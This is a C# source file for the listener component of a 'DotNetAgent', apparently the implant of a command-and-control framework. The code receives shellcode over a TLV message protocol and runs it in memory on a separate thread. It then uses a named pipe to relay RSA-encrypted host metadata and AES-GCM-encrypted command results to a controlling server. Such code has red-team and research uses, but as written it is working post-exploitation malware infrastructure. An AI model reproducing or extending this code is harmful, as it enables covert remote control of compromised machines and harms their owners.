using System;
using System.Threading;

namespace DotNetAgent
{
    internal class Listener
    {
        private const byte TLV_TYPE_METADATA_REQUEST = 0x21;
        private const byte TLV_TYPE_RESULT_REQUEST = 0x22;
        private const byte TLV_TYPE_SERVER_DATA = 0x23;
        private const byte TLV_TYPE_ENCRYPTED_METADATA = 0x12;
        private const byte TLV_TYPE_ENCRYPTED_DATA = 0x13;
        private const byte TLV_TYPE_METADATA_IS_IT_ENCRYPTED = 0x1;
        private const byte TLV_TYPE_IS_IT_REQUEST = 0x1;
        private const byte TLV_TYPE_AGENT_CONFIGURATION = 0x2;
        private const byte TLV_TYPE_SEQUENCE = 0x2;
        private const byte TLV_TYPE_SHELLCODE = 0x3;
        // TLV_TYPE_DATA, TLV_TYPE_IV, and TLV_TYPE_PIPENAME share value 0x4.
        // This is safe because they appear in different parent TLV contexts:
        // - TLV_TYPE_DATA is a child of request/response TLVs
        // - TLV_TYPE_IV is a child of TLV_TYPE_ENCRYPTED_DATA
        // - TLV_TYPE_PIPENAME is a child of listener load TLVs
        private const byte TLV_TYPE_DATA = 0x4;
        private const byte TLV_TYPE_IV = 0x4;
        private const byte TLV_TYPE_PIPENAME = 0x4;
        private const byte TLV_TYPE_CONF = 0x5;
        private const byte TLV_TYPE_CYPHERTEXT = 0x10;
        private const byte TLV_TYPE_LISTENER_NEW_CONF = 0x20;
        private static readonly byte[] TLV_VALUE_YES = new byte[] { 0x1 };
        private static readonly byte[] TLV_VALUE_NO = new byte[] { 0x0 };


        private static readonly byte[] VERSION_1 = new byte[] { 0x1 };

        private NamedPipeCommunication _pipeCommunication;
        private Thread _shellcodeThread;
        private byte[] _shellcode;
        private string _pipeName;
        private byte[] _conf = new byte[0];

        public bool Load(TLV tlv)
        {
            if (!tlv.HasChild(TLV_TYPE_SHELLCODE) || !tlv.HasChild(TLV_TYPE_PIPENAME))
                return false;
            _shellcode = tlv.GetChild(TLV_TYPE_SHELLCODE).Data;
            _pipeName = tlv.GetChild(TLV_TYPE_PIPENAME).GetAsString();
            if (tlv.HasChild(TLV_TYPE_CONF))
                _conf = tlv.GetChild(TLV_TYPE_CONF).Data;
            TLV agentConfiguration = tlv.GetChild(TLV_TYPE_AGENT_CONFIGURATION);
            if (agentConfiguration != null &&
                (agentConfiguration.IsParent || agentConfiguration.Data == null || agentConfiguration.Data.Length != sizeof(long)))
            {
                Logger.Warning("Listener agent configuration must contain exactly 8 bytes for payload ID");
                return false;
            }
            Metadata.SetPayloadId(agentConfiguration?.GetAsInt64());
            return true;
        }

        public bool Start()
        {
            _pipeCommunication = new NamedPipeCommunication();
            if (!_pipeCommunication.CreatePipe(_pipeName))
            {
                Logger.Warning("Could not create named pipe");
                return false;
            }
            _shellcodeThread = new Thread(StartShellcode);
            _shellcodeThread.Start();
            _pipeCommunication.WaitConnection(_conf, (data) => GotNewData(data), () => GotDisconnected());
            return true;
        }

        public void SendMessage(byte[] data)
        {
            if (_pipeCommunication != null) 
            {
                TLV confTlv = new TLV(TLV_TYPE_LISTENER_NEW_CONF);
                confTlv.AddChild(new TLV(TLV_TYPE_IS_IT_REQUEST, TLV_VALUE_NO));
                confTlv.AddChild(new TLV(TLV_TYPE_SEQUENCE, BitConverter.GetBytes(0xFFFFFF)));
                confTlv.AddChild(new TLV(TLV_TYPE_DATA, data));
                _pipeCommunication.Send(confTlv.GetFullBuffer());
            } 
        }

        private void GotNewData(byte[] data)
        {
            TLV tlv = new TLV();
            if (!tlv.Load(data))
            {
                Logger.Warning("Listener shellcode data was faulty");
                return;
            }

            UInt32 seq = tlv.HasChild(TLV_TYPE_SEQUENCE) ? tlv.GetChild(TLV_TYPE_SEQUENCE).GetAsUInt32() : 0;
            TLV response = null;
            switch (tlv.Type)
            {
                case TLV_TYPE_METADATA_REQUEST:
                    byte[] metadata = Metadata.GetBuffer();
                    byte[] encryptedMetadata = Encryption.EncryptRSA(metadata);
                    if (encryptedMetadata == null)
                    {
                        Logger.Warning("Failed to RSA-encrypt metadata");
                        break;
                    }

                    TLV metadataTlv = new TLV(TLV_TYPE_ENCRYPTED_METADATA);
                    metadataTlv.AddChild(new TLV(TLV_TYPE_METADATA_IS_IT_ENCRYPTED, VERSION_1));
                    metadataTlv.AddChild(new TLV(TLV_TYPE_CYPHERTEXT, encryptedMetadata));

                    response = new TLV(TLV_TYPE_METADATA_REQUEST);
                    response.AddChild(new TLV(TLV_TYPE_IS_IT_REQUEST, TLV_VALUE_NO));
                    response.AddChild(new TLV(TLV_TYPE_SEQUENCE, BitConverter.GetBytes(seq)));
                    response.AddChild(new TLV(TLV_TYPE_DATA, metadataTlv.GetFullBuffer()));
                    break;

                case TLV_TYPE_RESULT_REQUEST:
                    response = new TLV(TLV_TYPE_RESULT_REQUEST);
                    response.AddChild(new TLV(TLV_TYPE_IS_IT_REQUEST, TLV_VALUE_NO));
                    response.AddChild(new TLV(TLV_TYPE_SEQUENCE, BitConverter.GetBytes(seq)));

                    byte[] result = MessagesManager.GetNextResult();
                    if (result != null)
                    {
                        byte[] iv = Encryption.GenerateIV();
                        byte[] encryptedResult = Encryption.EncryptAesGcm(result, iv);
                        if (encryptedResult == null)
                        {
                            Logger.Warning("Failed to AES-GCM encrypt result, sending empty response");
                            response.AddChild(new TLV(TLV_TYPE_DATA, new byte[0]));
                            break;
                        }

                        TLV encryptedTlv = new TLV(TLV_TYPE_ENCRYPTED_DATA);
                        encryptedTlv.AddChild(new TLV(TLV_TYPE_METADATA_IS_IT_ENCRYPTED, TLV_VALUE_YES));
                        encryptedTlv.AddChild(new TLV(TLV_TYPE_IV, iv));
                        encryptedTlv.AddChild(new TLV(TLV_TYPE_CYPHERTEXT, encryptedResult));

                        response.AddChild(new TLV(TLV_TYPE_DATA, encryptedTlv.GetFullBuffer()));
                    }
                    else
                    {
                        response.AddChild(new TLV(TLV_TYPE_DATA, new byte[0]));
                    }
                    break;

                case TLV_TYPE_SERVER_DATA:
                    NewDataFromServer(tlv.Data);
                    break;
            }
            if (response != null)
                _pipeCommunication.Send(response.GetFullBuffer());
        }

        private void NewDataFromServer(byte[] data)
        {
            TLV tlv = new TLV();
            int pos = 0;
            while (pos < data.Length)
            {
                if (!tlv.Load(data, pos))
                {
                    // Cannot advance position without valid FullSize, must abort remaining data
                    Logger.Warning("Parsing server data TLV failed");
                    return;
                }
                pos += (int)tlv.FullSize;
                if (tlv.Type != TLV_TYPE_ENCRYPTED_DATA)
                {
                    Logger.Warning("Parsing server data TLV was not encrypted envelope type");
                    continue;
                }
                if (!tlv.HasChild(TLV_TYPE_METADATA_IS_IT_ENCRYPTED) || tlv.GetChild(TLV_TYPE_METADATA_IS_IT_ENCRYPTED).GetAsByte() != 1)
                {
                    Logger.Warning("Server data was not encrypted");
                    continue;
                }
                if (!tlv.HasChild(TLV_TYPE_IV) || !tlv.HasChild(TLV_TYPE_CYPHERTEXT))
                {
                    Logger.Warning("Server data is missing ciphertext or IV");
                    continue;
                }
                byte[] decrypted = Encryption.DecryptAesGcm(tlv.GetChild(TLV_TYPE_CYPHERTEXT).Data, tlv.GetChild(TLV_TYPE_IV).Data);
                if (decrypted == null)
                {
                    Logger.Warning("Server data decryption failed!");
                    continue;
                }
                MessagesManager.LoadData(decrypted);
            }
        }

        private void GotDisconnected()
        {
            Logger.Info("Listener shellcode closed connection");
        }

        private void StartShellcode()
        {
            _pipeCommunication.WaitUntilListening();
            Logger.Info("Starting listener shellcode");
            PluginExecution.ExecuteAsShellcode(_shellcode);
            Logger.Warning("Listener shellcode ended - it should have not");
        }
    }
}
